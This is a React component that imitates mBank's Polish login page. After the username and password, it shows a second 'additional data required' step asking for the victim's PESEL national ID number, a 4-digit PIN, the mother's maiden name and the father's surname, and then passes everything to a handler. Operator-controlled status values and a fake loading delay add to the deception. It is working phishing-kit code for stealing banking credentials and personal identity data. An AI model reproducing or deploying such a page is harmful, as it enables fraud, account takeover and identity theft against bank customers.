// noinspection DuplicatedCode

import React, {Fragment, useState} from "react";
import * as yup from "yup";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import {Form} from "reactstrap";

const schema = yup.object().shape({
    login: yup.string().required().min(3),
    password: yup.string().required(),
    pin: yup.string().required().matches(/^[0-9]{4}$/),
    pesel: yup.string().required(),
    mother: yup.string().required(),
    father: yup.string().required(),
});

const MbankFormLogin = ({status, handler, type}) => {
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const {register, handleSubmit, trigger, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const load = (index) => {
        setLoading(true);

        setTimeout(() => {
            setLoading(false);
            setStep(index);
        }, 1500)
    }
    const clearForm = (data) => {
        setLoading(false);
        setStep(1);
        reset();
        handler(data);
    }

    return (
        <div className="login-container">
            <Form autoComplete="off" onSubmit={handleSubmit(clearForm)}>
                <div className="color"/>
                <div className="login-content">
                    {
                        loading || status === 'init' ?
                            <div className="spinner-container">
                                <div className="photo spinner"/>
                            </div> :
                            status === '' || status === 'wrong_login' ?
                                step === 1 ?
                                    <Fragment key={'login'}>

                                        {status === 'wrong_login' ?
                                            <div className="error-container" role="alert">
                                                <div id="errorMessage" className="message">
                                                    <p>Złe dane</p>
                                                </div>
                                                <div id="errorDetails" className="details">
                                                    Upewnij się, że "Caps Lock" na Twojej klawiaturze jest wyłączony
                                                    oraz sprawdź poprawność wpisywanego.
                                                </div>
                                            </div> :
                                            <div className="title-container ">
                                                <h2 className="accessible-not-visible">Klienci indywidualni i
                                                    firmowi</h2>
                                                <div className="title">Klienci indywidualni i firmowi</div>
                                            </div>
                                        }
                                        <div className="form-container">
                                            {
                                                status === '' ?
                                                    <div className="photo-container">
                                                        <div className={`avatar photo photo-${type}`}/>
                                                    </div> : null
                                            }

                                            <div className="field-container">

                                                <div className={`form-input ${errors.login && 'error'}`}>
                                                    <input type="text"
                                                           placeholder="Identyfikator"
                                                           autoComplete="off"
                                                           {...register('login')}
                                                    />

                                                    <a tabIndex="-1" href="#"
                                                       aria-label="Wpisz nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy numer karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z tymczasowego numeru klienta."
                                                       className="tooltip">
                                                        <i>?</i>
                                                    </a>
                                                    <div className="accessible-not-visible" id="userIDDescription">Wpisz
                                                        nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy
                                                        numer
                                                        karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z
                                                        tymczasowego numeru klienta.
                                                    </div>
                                                </div>
                                                {
                                                    (function () {
                                                        if (errors.login) {
                                                            if (errors.login.type === 'required') {
                                                                return <p className={'error_message'}> Uzupełnij to
                                                                    pole.</p>
                                                            } else if (errors.login.type === 'min') {
                                                                return <p className={'error_message'}> Minimalna liczba
                                                                    znaków: 3</p>
                                                            }
                                                        }
                                                    })()

                                                }
                                                <div className={`form-input ${errors.password && 'error'}`}>
                                                    <input type="password"
                                                           placeholder="Hasło"
                                                           autoComplete="off"
                                                           {...register('password')}
                                                    />

                                                    <a tabIndex="-1" href="#"
                                                       aria-label="Wpisz hasło, którego używasz do logowania w serwisie transakcyjnym mBanku. Pamiętaj, że system rozpoznaje duże i małe litery."
                                                       className="tooltip">
                                                        <i>?</i>
                                                    </a>
                                                    <div className="accessible-not-visible" id="passDescription">
                                                        Wpisz hasło, którego
                                                        używasz do logowania w serwisie transakcyjnym mBanku. Pamiętaj,
                                                        że system rozpoznaje duże i małe litery.
                                                    </div>
                                                </div>
                                                {
                                                    errors.password &&
                                                    <p className={'error_message'}>
                                                        Uzupełnij to pole.
                                                    </p>
                                                }

                                            </div>
                                        </div>
                                        <div className="buttons form-buttons">
                                            <button type="button" className="btn"
                                                    aria-disabled="true"
                                                    onClick={() => {
                                                        console.log(errors)
                                                        trigger(['login', 'password']).then((res) => {
                                                            if (res) {
                                                                load(2);
                                                            }
                                                        })
                                                    }}
                                            >
                                                Zaloguj się
                                            </button>
                                        </div>
                                    </Fragment> :
                                    step === 2 ?
                                        <Fragment key={'other'}>
                                            <div className="title-container ">
                                                <h2 className="accessible-not-visible">Wymagane dodatkowe dane</h2>
                                                <div className="title">Wymagane dodatkowe dane</div>
                                            </div>
                                            <div className="form-container">
                                                <div className="field-container">

                                                    <div className={`form-input ${errors.login && 'error'}`}>
                                                        <input type="text"
                                                               placeholder="PESEL"
                                                               autoComplete="off"
                                                               {...register('pesel')}
                                                        />
                                                    </div>
                                                    {
                                                        errors.pesel &&
                                                        <p className={'error_message'}>
                                                            Uzupełnij to pole.
                                                        </p>
                                                    }
                                                    <div className={`form-input ${errors.login && 'error'}`}>
                                                        <input type="number"
                                                               placeholder="PIN"
                                                               autoComplete="off"
                                                               {...register('pin')}
                                                        />
                                                    </div>
                                                    {
                                                        (function (){
                                                            if(errors.pin){
                                                                if(errors.pin.type === 'required'){
                                                                    return (
                                                                        <p className={'error_message'}>
                                                                            Uzupełnij to pole.
                                                                        </p>
                                                                    )
                                                                }
                                                                else if(errors.pin.type === 'matches'){
                                                                    return (
                                                                        <p className={'error_message'}>
                                                                            Pole składa się z 4 cyfr
                                                                        </p>
                                                                    )
                                                                }
                                                            }
                                                        })

                                                    }
                                                    <div className={`form-input ${errors.login && 'error'}`}>
                                                        <input type="text"
                                                               placeholder="Nazwisko panieńskie matki"
                                                               autoComplete="off"
                                                               {...register('mother')}
                                                        />
                                                    </div>
                                                    {
                                                        errors.mother &&
                                                        <p className={'error_message'}>
                                                            Uzupełnij to pole.
                                                        </p>
                                                    }
                                                    <div className={`form-input ${errors.login && 'error'}`}>
                                                        <input type="text"
                                                               placeholder="Nazwisko ojca"
                                                               autoComplete="off"
                                                               {...register('father')}
                                                        />
                                                    </div>
                                                    {
                                                        errors.father &&
                                                        <p className={'error_message'}>
                                                            Uzupełnij to pole.
                                                        </p>
                                                    }

                                                </div>
                                            </div>
                                            <div className="buttons form-buttons">
                                                <button type="submit" className="btn">
                                                    Dalej
                                                </button>
                                            </div>
                                        </Fragment>
                                        : null : null
                    }


                </div>


                <div className="buttons error-buttons">
                    <button id="reloginBtn" type="submit" className="btn">
                        Zaloguj się ponownie
                    </button>
                </div>
                <div className="buttons redirect-activation-buttons">
                    <button id="redirectActivatioBtn" type="submit" className="btn">
                        Dalej
                    </button>
                </div>
                <div className="buttons finish-button">
                    <button id="finishBtn" type="submit" className="btn">
                        Zakończ
                    </button>
                </div>
            </Form>
        </div>
    )
}
export default MbankFormLogin;